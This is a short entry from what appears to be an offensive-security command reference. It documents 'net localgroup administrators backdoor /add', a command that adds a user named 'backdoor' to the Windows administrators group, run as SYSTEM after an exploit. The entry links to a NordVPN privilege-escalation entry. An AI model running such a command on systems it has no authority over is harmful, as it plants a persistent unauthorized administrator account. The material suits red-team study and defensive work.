---
data: net localgroup administrators backdoor /add
tags:
  - net
  - group-add
  - admin-escalation
type: command
output: The command completed successfully
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.558Z'
id: c75b6f7b-63b8-47a8-a878-95207e467df5
verified: false
validated: true
submitted: true
---
# net-localgroup-administrators-backdoor-add

## Command

```cmd
net localgroup administrators backdoor /add
```

## Description

Adds the 'backdoor' user to the local administrators group, granting full admin privileges, executed as SYSTEM via the exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| group | Target group (administrators) | Yes |
| username | User to add (backdoor) | Yes |
| /add | Flag to add the user to the group | Yes |

## Examples

### Basic Usage

```cmd
net localgroup administrators backdoor /add
```

### Advanced Usage

```cmd
net localgroup administrators backdoor /add /domain
```

## Expected Output

The command completed successfully.

## Related

- [[commands/net-user-backdoor-add]]
- [[commands/invoke-exploitnordvpnconfiglpe-add-backdoor-user]]
